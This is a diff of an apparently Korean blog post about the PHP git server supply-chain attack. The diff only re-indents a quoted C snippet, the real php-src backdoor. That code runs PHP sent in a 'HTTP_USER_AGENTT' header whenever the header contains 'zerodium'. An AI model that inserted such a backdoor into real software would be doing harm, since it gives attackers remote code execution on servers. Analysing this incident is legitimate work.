@@ -33,17 +33,17 @@ PHP의 git 서버가 공급망 해킹에 당해 앞으로 php-src는 Github를 �
 # PHP-src에 삽입된 악성 코드
 
 ```c
-	zval *enc;
+zval *enc;
 
-	if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
-		(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
-		convert_to_string(enc);
-		if (strstr(Z_STRVAL_P(enc), "zerodium")) {
-			zend_try {
-				zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
-			} zend_end_try();
-		}
+if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
+	(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
+	convert_to_string(enc);
+	if (strstr(Z_STRVAL_P(enc), "zerodium")) {
+		zend_try {
+			zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
+		} zend_end_try();
 	}
+}
 ```
 이 코드는 HTTP 헤더에 zerodium이 있을 때 User agent에 삽입된 PHP코드를 실행 시키는 악성 코드입니다.
 
